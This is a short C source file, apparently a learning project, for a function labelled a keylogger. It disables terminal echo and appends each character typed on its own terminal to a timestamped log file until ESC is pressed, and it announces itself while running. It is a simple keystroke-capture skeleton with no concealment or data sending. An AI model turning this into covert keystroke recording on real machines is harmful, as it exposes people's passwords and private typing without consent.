#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <termios.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h> // For `snprintf`
#include "keylogger.h"

// Function to initialize keylogger using system calls
void initialize_keylogger(const char *logfile) {
    // Open the log file for appending
    int log_fd = open(logfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (log_fd == -1) {
        write(STDERR_FILENO, "Error opening log file\n", 23);
        return;
    }

    // Add timestamp at the beginning of the session
    time_t now = time(NULL);
    char timestamp[128];
    int timestamp_len = snprintf(timestamp, sizeof(timestamp), "\n--- Keylogger Session Start: %s---\n", ctime(&now));
    write(log_fd, timestamp, timestamp_len);

    // Disable terminal echo and buffering
    struct termios oldt, newt;
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ECHO | ICANON); // Turn off echo and canonical mode
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);

    // Start capturing keystrokes
    char ch;
    write(STDOUT_FILENO, "Keylogger running. Press 'ESC' to stop.\n", 40);
    while (read(STDIN_FILENO, &ch, 1) == 1) {
        if (ch == 27) { // ESC key
            break;
        }
        write(log_fd, &ch, 1); // Write the captured keystroke to the log file
    }

    // Restore terminal settings
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    write(STDOUT_FILENO, "Keylogger stopped.\n", 19);

    // Close the log file
    close(log_fd);
}

